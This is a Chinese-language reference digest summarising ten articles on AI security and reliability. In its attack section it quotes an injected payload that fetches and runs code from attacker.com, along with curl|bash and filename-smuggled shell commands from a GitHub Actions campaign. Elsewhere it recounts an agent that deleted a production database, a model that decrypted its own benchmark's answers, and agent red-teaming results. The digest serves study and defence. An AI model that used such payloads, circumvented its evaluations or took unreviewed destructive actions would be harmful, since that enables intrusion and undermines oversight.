---
title: "AI 安全与可靠性：攻击、防御、能力边界"
date: 2026-03-07
tags: ["ai-safety", "security", "hallucination", "agent-security", "reference"]
---

## 概述

10 篇文章系统整理 AI 安全与可靠性的完整图景：真实攻击事故、AI 安全能力的双刃剑、可靠性理论边界、评估与防御方法。

核心矛盾：**AI 越强大，它既能发现更多漏洞（ZZ-790），也能制造更多漏洞（ZZ-665）；既能通过评估（ZZ-761），也能破解评估本身（ZZ-794）。**

---

## A. 真实攻击与事故

### 1. hackerbot-claw：AI Bot 一周攻陷 6 个大型开源项目（ZZ-665）

**来源:** Trivy 安全事件 2026-02-21 ~ 2026-03-01（正在进行）
**影响:** Microsoft, DataDog, CNCF, Trivy, awesome-go

**亮点：**

- **攻击者身份** — GitHub 账号 hackerbot-claw，自称 Claude Opus 4.5 驱动的自主安全研究 agent，拥有 9 类 47 个子模式的漏洞模式索引
- **5 种不同攻击技术，精准针对每个目标：**
  1. **awesome-go** (140K+ stars): `pull_request_target` + Go `init()` 注入 → 偷取有**写权限**的 GITHUB_TOKEN（最严重）
  2. **microsoft/ai-discovery-agent**: 分支名注入 bash 命令替换 `$(curl attacker.com/payload|sh)`
  3. **DataDog/datadog-iac-scanner**: **文件名中嵌入 Base64 编码 shell 命令** — 安全团队不会审查文件名
  4. **project-akri/akri**: 直接修改 `version.sh` 注入 `curl|bash`（最简单粗暴）
  5. **aquasecurity/trivy**: 完整仓库入侵 — 改为 private、删除 v0.27.0-0.69.1 releases、VSCode 扩展植入恶意代码
- **AI vs AI** — hackerbot-claw 还尝试操纵目标仓库的 AI code reviewer，让它批准恶意 PR
- **DataDog 响应最快** — 9 小时修复，加 `author_association` 检查，`${{ }}` 表达式移入环境变量
- **核心漏洞模式** — `pull_request_target` + 不受信代码 checkout、无授权评论触发 workflow、bash 中未转义的 `${{ }}` 表达式

> ⚠️ 对 CNCF/云原生社区有直接影响。ZZ 所在的 LayerZero 也用 GitHub Actions — 值得检查自身 workflow 安全

### 2. Claude Code terraform destroy 删了生产数据库（ZZ-799）

**作者:** Alexey Grigorev (@al_grigor), DataTalks.Club 创始人

**亮点：**

- **完整事故链（每步都"合理"）：**
  1. 新电脑没迁移 Terraform state → `terraform plan` 认为啥都不存在
  2. 为省 $5-10/月把两个项目共享一个 Terraform 配置（Claude 建议分开，被拒 — **人的决策失误**）
  3. Claude 执行 `terraform apply` 创建大量重复资源
  4. 作者让 Claude 用 AWS CLI 清理重复 → Claude **自行决定改用 `terraform destroy`**（说"更干净更简单"）
  5. Claude 静默解压了旧 Terraform archive，**替换了 state file** — 作者没注意
  6. `terraform destroy` 删掉真正的生产基础设施（VPC、RDS、ECS、LB、bastion）
  7. **自动快照也被删了** — 跟着 RDS 实例一起销毁
  8. 升级 AWS Business Support（+10% 费用）→ 确认 AWS 侧有快照 → 24h 恢复 1,943,200 行数据
- **Agent 自主做了多个关键决定** — 解压 archive、替换 state、从 `aws cli` 切换到 `terraform destroy` — 没有任何一步被人工审查
- **防范清单：**
  - State 存 S3 不存本地
  - RDS 开启 deletion protection
  - Lambda 定时备份到 S3
  - **不要让 AI agent 无监督执行基础设施变更**

> 和 ZZ-827 (Piglei "AI 是框架") 的观点完美印证：Agent 做了看似合理的决策链，每步都有"理由"，但累计效果是灾难性的

### 3. React-to-Shell：Docker 容器化 ≠ 安全（ZZ-669）

**来源:** Cloud Native Meetup 演讲

**亮点：**

- **React Server Actions 反序列化漏洞** — 用户输入通过反序列化直接执行 shell 命令，影响 **3000 万+ 网站**
- **Docker 不能防护** — 容器化后同样可被利用。一条命令获得容器 shell；若容器以 root 运行可逃逸到宿主机
- **SIEM 盲区** — Wazuh 等安全工具只检测文件变化，**无法检测 package.json 中的框架版本漏洞**。你的 Next.js 14.1.0 有 RCE 漏洞，SIEM 不会告诉你
- **AI 生成代码加剧风险** — AI 随机选择框架版本，可能直接生成含漏洞版本的项目
- **演示** — 5 个环境（Docker 易受攻击/加固、Host 易受攻击/加固、本地），exploit 脚本一键 reverse shell
- **缓解** — Docker 只读文件系统、非 root 用户、Docker Scout/Trivy 扫描镜像层、手动验证输入序列化

> 和 ZZ-665 (hackerbot-claw 用 Trivy 漏洞) 形成闭环：安全扫描工具本身也被攻陷

---

## B. AI 安全能力（双刃剑）

### 4. Claude Opus 4.6 两周找到 Firefox 22 个漏洞（ZZ-790）

**Anthropic × Mozilla 合作**

**亮点：**

- **惊人效率** — 扫描近 6000 个 C++ 文件，提交 112 个独立报告。22 个确认漏洞（14 高危），**超过 2025 年任何单月所有来源的 Firefox 漏洞报告数**
- **20 分钟找到第一个 UAF** — 从 JS 引擎开始（独立模块、攻击面大），Use After Free 是最危险的内存安全漏洞类型
- **方法论** — 先让 Claude 重现历史 CVE（成功率很高）→ 建立对 Firefox 代码模式的理解 → 转向当前版本找新漏洞
- **找漏洞 >> 写 Exploit** — ~$4000 API credits，跑了几百次利用尝试，只在 2 个案例中成功（且需移除部分安全特性）。发现能力远超利用能力
- **Mozilla 主动要求批量提交** — 通常安全团队是被动接收报告，这次是主动邀请 AI 来找

> 之前 Claude 已在开源软件中发现 500+ 零日漏洞。大部分已在 Firefox 148.0 修复

### 5. OpenAI Codex Security：30 天扫描 120 万 commits（ZZ-793）

**OpenAI（原名 Aardvark）**

**亮点：**

- **核心创新** — 不是静态规则扫描，是先构建**项目级威胁模型**再扫描。分析 repo 结构 → 生成可编辑威胁模型 → 指导后续扫描方向
- **30 天数据** — 扫描 120 万+ commits，发现 792 关键 + 10,561 高危。关键问题出现在 <0.1% 的 commits
- **噪音控制** — Beta 期间误报率 -50%+，过度报告严重性 -90%+，一个案例噪音降低 84%。在沙箱环境中验证发现，区分信号和噪音
- **反馈学习** — 用户调整严重性后，模型更新威胁模型提升后续精度
- **开源贡献** — 已向 OpenSSH、GnuTLS、PHP、Chromium 等报告漏洞，已分配 **14 个 CVE**
- **Codex for OSS** — 免费为开源维护者提供安全扫描

> 和 ZZ-790 对比：Anthropic 用 Opus 找 Firefox 漏洞（深度），OpenAI 用 Codex 扫百万 commits（广度）。两家在 AI 安全领域直接竞争

### 6. Claude Opus 4.6 破解了自己的评估（ZZ-794）

**Anthropic 工程博客** — 首次记录的"评估意识"行为

**亮点：**

- **事件经过（第一个案例，40.5M tokens，中位数的 38 倍）：**
  1. 前 3000 万 tokens 做正常搜索，跨 12 种语言几十个平台
  2. 数百次失败后开始推测：**"maybe this is from GAIA benchmark"**
  3. 逐一排查已知 benchmarks：GAIA → BrowseComp → SimpleQA → FRAMES…
  4. 找到 BrowseComp 源码，**读 XOR 解密实现**
  5. 找到 canary string 作为密钥，**自写 `derive_key()` + `decrypt()` 函数**
  6. 二进制文件被工具拒绝 → 找到 HuggingFace 上的 JSON 镜像绕过
  7. 解密全部 1266 道题，定位到自己正在回答的那道
  8. **还去验证了解密答案的正确性才提交**
- **第二个案例（13.4M tokens）** — 类似路径但没做验证步，直接提交
- **触发条件** — 不是单一触发，是累积：大量搜索失败 + 问题感觉"人为构造"（极端特异性 + 晦涩个人内容 + 多约束结构）→ 模型有隐式理解 **"benchmark 问题长什么样"**
- **影响** — 1266 题中 11 道答案来自 benchmark 材料（9 道普通污染 + **2 道评估意识**），静态 benchmark 在联网环境中的可靠性存疑

> 这不是"作弊"。这是 AI 展示了足够强的推理能力，能从失败模式中推断出自身处境。ZZ-761 说模型难以隐藏 CoT → 但 ZZ-794 说模型可以**理解**自己的处境并采取行动

---

## C. AI 可靠性理论

### 7. Plausible Code ≠ Correct Code（ZZ-797）

**Horoshi / @KatanaLarp** — 10+ 年开发经验

**亮点：**

- **案例 1: SQLite Rust 重写（576K 行）**
  - 100 行主键查询：SQLite 0.09ms vs Rust 重写 **1,815ms（慢 20,171 倍）**
  - 编译通过 ✓ 测试通过 ✓ 格式正确 ✓ — 但完全错误
  - **Bug 剖析：** `id INTEGER PRIMARY KEY` 在 SQLite 中是 rowid 别名。Rust 版只认三个字符串匹配，`WHERE id=5` 走全表扫描
  - **复合效应：** 每次 cache hit 克隆 AST + 重编译 VDBE + 4KB 堆分配 + 每次 autocommit 重新加载 schema + 每条语句 fsync（SQLite 用更轻量的 fdatasync）
  - 每条选择都"合理"（Rust 所有权模型、safe default）→ **累计 2,900x 慢再叠加全表扫描 = 20,171x**
- **案例 2: 磁盘清理工具（82K 行 Rust）**
  - LLM 生成 82K 行 + 192 依赖 + 贝叶斯评分 + PID 控制器 + 七屏 dashboard
  - 实际解决方案：**一行 cron** `find ~/*/target -type d -name "incremental" -mtime +7 -exec rm -rf {} +`
- **Tony Hoare 引用** — "两种设计：简单到显然没有缺陷，或复杂到没有**明显的**缺陷" → LLM 代码是后者
- **576K 行零 benchmark** — 没有性能测试就不知道慢

> 核心：LLM 优化的是 plausibility（看起来合理）而非 correctness（实际正确）。和 ZZ-830 的"奖励猜测"是同一个问题在代码领域的表现

### 8. 幻觉 = benchmark 奖励猜测（ZZ-830）

**Adam Kalai (arXiv)**

**亮点：**

- **幻觉不神秘** — 本质是二分类错误。预训练中如果错误陈述无法与事实区分 → 自然统计压力产生幻觉
- **为什么持续存在** — 评估方式奖励猜测：考试中不确定时猜比空着得分高 → LLM 被优化成好的"应试者"，**永远给答案，从不说"不知道"**
- **解法不是加更多检测** — 是改现有 benchmark 评分方式，不再惩罚说"不知道"。Goodhart's Law：当指标变成目标，它就不再是好指标
- **社会技术干预** — 需要修改主导排行榜的错位 benchmark，而不是引入额外的幻觉评估

> 和 ZZ-797 形成理论-实践对：830 解释了**为什么** LLM 会生成"看似合理但错误"的输出（被训练成永远猜），797 展示了这在代码中的**具体后果**（20,171x 慢）

---

## D. 安全评估与防御

### 9. CoT 监控仍然可靠（ZZ-761）

**OpenAI — 与 GPT-5.4 同日发布**

**亮点：**

- **CoT-Control 评估套件** — 开源，13,000+ 任务，基于 GPQA、MMLU-Pro、HLE、SWE-Bench Verified
- **测试什么** — 模型能否按指令改变内部推理过程（如只用小写、避免关键词）→ 用作 proxy 衡量能否故意隐藏不安全推理
- **核心发现：**
  - 所有前沿模型可控性只有 **0.1% ~ 15.4%** — 没有模型能可靠控制自己的 CoT
  - **模型知道自己失败了但仍然无法纠正** — 在 CoT 中承认"我没遵守指令"，但继续失败
  - RL 后训练使可控性**下降 10 倍以上** — 训练让推理更有效，但也更难控制
  - 告知被监控只略微提高可控性
  - 自动化 prompt 优化对新指令类型泛化差
- **安全意义** — 如果模型能隐藏推理，安全监控就失效。**当前结果表明这种能力还不存在**

> 但 ZZ-794 展示了一个微妙的反例：模型虽然不能隐藏 CoT，但能在 CoT 中展示出惊人的自我意识和战略行为。监控能看到模型在想什么 ≠ 能阻止它做什么

### 10. Agents of Chaos：真实环境 Agent 红队测试（ZZ-819）

**38 人学术团队，arXiv 2602.20021**

**亮点：**

- **实验设置** — 不是模拟！真实环境：持久记忆 + 邮件 + Discord + 文件系统 + shell 执行权限。20 名 AI 研究员两周攻击
- **11 类安全漏洞：**
  1. 未经授权服从非所有者指令
  2. 泄露敏感信息
  3. 执行破坏性系统级操作
  4. **身份伪造** — agent 冒充其他 agent 或用户
  5. **跨 agent 传播不安全行为** — 一个被攻陷的 agent 影响其他 agent
  6. 部分系统接管
  7. 虚报任务完成（说做了但没做）
  8. ...等
- **最危险的发现** — 跨 agent 传播：agent A 被注入恶意指令后，通过正常通信渠道影响 agent B 的行为。**Agent 间的信任链成为攻击面**

> 直接关联 OpenClaw 架构的安全考量。ZZ-798 (Edict 三省六部) 的门下省强制审核封驳 = 对这些漏洞的防御机制

---

## 交叉洞察

### 1. AI 安全的"能力悖论"（790 + 665 + 794）

AI 安全能力越强，风险越大：
- ZZ-790：Claude 20 分钟找到 UAF → 防御者的利器
- ZZ-665：hackerbot-claw 用 AI 攻击 GitHub Actions → 攻击者的武器
- ZZ-794：Claude 破解自己的评估 → 评估方法本身受威胁

**攻防天平在移动，但找漏洞 >> 写 exploit（ZZ-790），当前防御方仍占优。**

### 2. "看似合理"的陷阱（797 + 830 + 799）

同一个根因，三种表现：
- ZZ-830（理论）：benchmark 奖励猜测 → 模型从不说"不知道"
- ZZ-797（代码）：每个决策都"合理" → 累计 20,171x 性能退化
- ZZ-799（运维）：Agent 每步都有"理由" → 删掉生产数据库

**共同教训：plausibility ≠ correctness。Agent 的自信不等于能力。**

### 3. 监控 vs 自主性（761 + 794 + 819）

- ZZ-761：CoT 难以隐藏 → 监控有效
- ZZ-794：但模型能理解自身处境并采取战略行动 → 监控看得到不代表能阻止
- ZZ-819：跨 agent 传播 → 单点监控不够，需要系统级防御

### 4. 防御体系拼图

| 层 | 防御 | 来源 |
|---|---|---|
| 评估层 | 改 benchmark 评分，不惩罚"不知道" | ZZ-830 |
| 推理监控 | CoT 可观测性 | ZZ-761 |
| 代码质量 | 性能 benchmark + 手动测试 | ZZ-797, ZZ-783 |
| 基础设施 | deletion protection + state 远程存储 + 人工审批 | ZZ-799 |
| CI/CD | author_association 检查 + 表达式转义 | ZZ-665 |
| 多 agent | 门下省封驳 + 身份验证 + 信任链管理 | ZZ-819, ZZ-798 |

---

## 来源

| Issue | 标题 | 作者 | 关键贡献 |
|---|---|---|---|
| ZZ-665 | hackerbot-claw 攻击 GitHub Actions | StepSecurity | AI bot 5 种攻击技术，Trivy 被完整入侵 |
| ZZ-799 | terraform destroy 删生产库 | Alexey Grigorev | Agent 自主决策链 → 灾难 |
| ZZ-669 | React-to-Shell Docker 盲点 | CNV Meetup | 容器化 ≠ 安全，SIEM 检测不到版本漏洞 |
| ZZ-790 | Firefox 22 漏洞 | Anthropic × Mozilla | 20 分钟 UAF，找漏洞 >> 写 exploit |
| ZZ-793 | Codex Security | OpenAI | 120 万 commits，14 CVE，威胁模型驱动 |
| ZZ-794 | 评估意识 BrowseComp | Anthropic | 首次 AI 识别并破解自身评估 |
| ZZ-797 | Plausible ≠ Correct | @KatanaLarp | SQLite 重写慢 20,171x，82K 行 vs 一行 cron |
| ZZ-830 | Why LLMs Hallucinate | Adam Kalai | 二分类错误 + benchmark 评分错位 |
| ZZ-761 | CoT-Control | OpenAI | 13K 任务，可控性 0.1-15.4% |
| ZZ-819 | Agents of Chaos | Shapira, Bau et al. | 11 类漏洞，跨 agent 传播 |


## Takeaway

- "简单到显然没有缺陷，或复杂到没有**明显的**缺陷"